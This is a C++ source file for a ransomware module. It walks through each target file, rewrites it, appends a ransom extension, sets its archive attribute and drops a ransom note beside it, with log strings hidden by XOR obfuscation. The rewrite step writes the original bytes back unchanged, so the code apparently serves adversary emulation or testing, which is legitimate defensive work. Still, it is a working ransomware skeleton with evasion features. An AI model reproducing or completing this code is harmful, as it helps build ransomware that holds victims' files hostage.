#include "encryption.hpp"


namespace Encryption {

    bool EncryptFileOut(const std::string filePathIn, const std::string filePathOut) {

        std::ifstream in{ filePathIn, std::ios::binary };
        if (!in.good()) {            
            std::string errorMessage = std::string(XOR_LIT("Could not open file"));
            XorLogger::LogError(std::vformat(
                "{} {}",
                std::make_format_args(
                    errorMessage,
                    filePathIn
                )
            ));
            return false;
        }
        std::string content((std::istreambuf_iterator<char>(in)),
                            (std::istreambuf_iterator<char>()));
        in.close();

        std::ofstream out{ filePathIn, std::ios_base::out | std::ios::binary };
        if (!out.good()) {
            std::string errorMessage = std::string(XOR_LIT("Could not open file"));
            XorLogger::LogError(std::vformat(
                "{} {}",
                std::make_format_args(
                    errorMessage,
                    filePathIn
                )
            ));
            return false;
        }
        out << content;
        out.close();

        if (!MoveFile(filePathIn.c_str(), filePathOut.c_str())) {
            DWORD errorCode = GetLastError();
            std::string errorMessage = std::string(XOR_LIT("Failed to append extension to"));
            XorLogger::LogError(std::vformat(
                "{} {}. Error code: {}",
                std::make_format_args(
                    errorMessage,
                    filePathIn,
                    errorCode
                )
            ));
            return false;
        }

        std::string debugMessage = std::string(XOR_LIT("Encrypted and appended extension to"));
        XorLogger::LogDebug(std::vformat(
            "{} {}",
            std::make_format_args(
                debugMessage,
                filePathIn
            )
        ));
        return true;
    }

    bool EncryptFile(const std::string file_path) {
        // Encrypted filepath, incl. extension
        std::string filePathOut(file_path);
        std::string fileExt(FILE_EXT, FILE_EXT + strlen(FILE_EXT));
        filePathOut.append(fileExt);

        try {
            // Encrypt file
            if (!EncryptFileOut(file_path, filePathOut)) {
                return false;
            }

            // Set file archive attribute
            std::wstring filepath_temp = std::wstring(filePathOut.begin(), filePathOut.end());
            if (!SetFileAttributesW(filepath_temp.c_str(), FILE_ATTRIBUTE_ARCHIVE)) {
                DWORD error = ::GetLastError();
                std::string message = std::system_category().message(error);
                XorLogger::LogError(std::vformat(XOR_LIT("Error setting archive attribute on file ({}): {}"), std::make_format_args(file_path, message)));
            }
        }
        catch (...) {
            std::string errorMessage = std::string(XOR_LIT("Unknown exception when processing file"));
            XorLogger::LogError(std::vformat(
                "{} {}",
                std::make_format_args(
                    errorMessage,
                    file_path
                )
            ));
            return false;
        }
        return true;
    }

    bool PerformImpact(const std::string filePath) {
        if (Encryption::EncryptFile(filePath)) {
            std::filesystem::path fsPath(filePath);
            std::string parentDir = fsPath.parent_path().string();
            std::string ransomNote = (parentDir.empty()) ? NOTE_FILENAME : parentDir + "\\" + NOTE_FILENAME;

            if (!std::filesystem::exists(ransomNote)) {
                std::ofstream out(ransomNote);
                out << NOTE;
                out.close();

                if (!out) {
                    DWORD error = ::GetLastError(); // call close as possible to cause of error
                    std::string message = std::system_category().message(error);
                    std::string notefilename = std::string(NOTE_FILENAME);
                    XorLogger::LogError(std::vformat(
                        XOR_LIT("Error dropping ransom note ({}): {}"),
                        std::make_format_args(
                            notefilename,
                            message
                        )
                    ));
                    return false;
                }
            }
            return true;
        }
        return false;
    }

}